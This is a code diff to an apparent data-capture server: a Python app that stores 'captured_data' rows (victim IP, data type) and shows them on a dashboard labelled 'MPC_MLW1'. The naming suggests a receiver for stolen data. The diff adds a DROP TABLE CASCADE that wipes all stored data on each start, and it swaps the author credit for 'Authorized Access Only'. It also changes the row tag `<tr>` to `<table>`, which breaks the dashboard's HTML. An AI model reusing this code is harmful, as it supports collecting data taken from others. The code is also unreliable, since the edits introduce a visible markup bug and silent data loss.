@@ -15,8 +15,10 @@ def get_db():
 def init_db():
     conn = get_db()
     cur = conn.cursor()
+    # Drop and recreate to ensure correct schema
+    cur.execute("DROP TABLE IF EXISTS captured_data CASCADE")
     cur.execute('''
-        CREATE TABLE IF NOT EXISTS captured_data (
+        CREATE TABLE captured_data (
             id SERIAL PRIMARY KEY,
             timestamp TIMESTAMP DEFAULT NOW(),
             ip TEXT,
@@ -28,7 +30,7 @@ def init_db():
     conn.commit()
     cur.close()
     conn.close()
-    print("[+] Database ready")
+    print("[+] Database table created with correct schema")
 
 init_db()
 
@@ -82,7 +84,7 @@ DASHBOARD_HTML = '''
             const data = await res.json();
             let html = '';
             for (let r of data) {
-                html += `<tr>
+                html += `<table>
                     <td>${r.timestamp}</td>
                     <td>${r.ip}</td>
                     <td><span class="badge">${r.data_type}</span></td>
@@ -92,7 +94,6 @@ DASHBOARD_HTML = '''
             document.getElementById('data').innerHTML = html;
             document.getElementById('stats').innerHTML = `📊 Total captured: ${data.length}`;
             
-            // Update status based on last capture time
             const statusRes = await fetch('/api/status');
             const statusData = await statusRes.json();
             const statusEl = document.getElementById('status');
@@ -125,7 +126,7 @@ DASHBOARD_HTML = '''
         <tbody id="data"></tbody>
     </table>
     </div>
-    <div class="footer">MPC_MLW1 Security Operations - Tool Created by Mugisha Pc</div>
+    <div class="footer">MPC_MLW1 Security Operations - Authorized Access Only</div>
 </div>
 </body>
 </html>
